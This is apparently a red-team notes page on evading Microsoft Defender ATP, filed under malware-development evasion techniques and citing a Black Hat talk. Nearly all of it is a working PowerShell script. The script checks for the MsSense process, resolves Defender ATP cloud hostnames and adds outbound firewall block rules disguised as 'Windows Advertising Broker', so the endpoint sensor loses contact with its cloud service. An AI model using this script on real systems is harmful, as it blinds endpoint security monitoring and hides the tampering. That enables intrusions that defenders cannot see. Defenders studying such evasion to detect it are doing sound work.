# Firewalls

```powershell
# Define Cloud Security Vendor Address
# Windows Defender ATP

$MSATP1 = "securitycenter.windows.com"
$MSATP2 = "winatp-gw-cus.microsoft.com"
$MSATP3 = "winatp-gw-eus.microsoft.com"
$MSATP4 = "winatp-gw-weu.microsoft.com"
$MSATP5 = "winatp-gw-neu.microsoft.com"
$MSATP6 = "us.vortex-win.data.microsoft.com"
$MSATP7 = "eu.vortex-win.data.microsoft.com"
$MSATP8 = "psapp.microsoft.com"
$MSATP9 = "psappeu.microsoft.com"
$MSATPURLs = $MSATP1,$MSATP2,$MSATP3,$MSATP4,$MSATP5,$MSATP6,$MSATP7,$MSATP8,$MSATP9

# Checking for Behavioural Analysis AV security product processes and adding outbound FW blocks
Write-Output ("[*] Checking for Behavioural Analytics AV security product processes and adding outbound firewall block rules" + "`n")
[CmdletBinding()]
$processnames = Get-Process | Select-Object ProcessName
Foreach ($ps in $processnames) {
    if ($ps.ProcessName -like "*MsSense*") {
        Write-Output ("[*] Defender ATP process " + $ps.ProcessName + " is running." + " Resolving ATP FQDN IP's and blocking outbound connections.")
        $MSATPCouldIPs = $MSATPURLs | foreach {[System.Net.Dns]::GetHostAddresses($_)} | Select-Object -ExpandProperty IPAddressToString
        Foreach-Object {
            New-NetFirewallRule -DisplayName "Windows Advertising Broker" -Direction Outbound -Action Block -RemoteAddress "$_" -Profile Any
            Write-Host "$_ - Outbound Firewall Block Was Added: $?"
        }
    }
}
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/Malware Development/Helpers/Evasion/Detection/Security Vendors/Windows/Microsoft]]

### Blackhat

- [Blackhat: Red Team Techniques for Evading, Bypassing, and Disabling MS Advanced Threat Protection and Advanced Threat Analytics](https://www.blackhat.com/docs/eu-17/materials/eu-17-Thompson-Red-Team-Techniques-For-Evading-Bypassing-And-Disabling-MS-Advanced-Threat-Protection-And-Advanced-Threat-Analytics.pdf)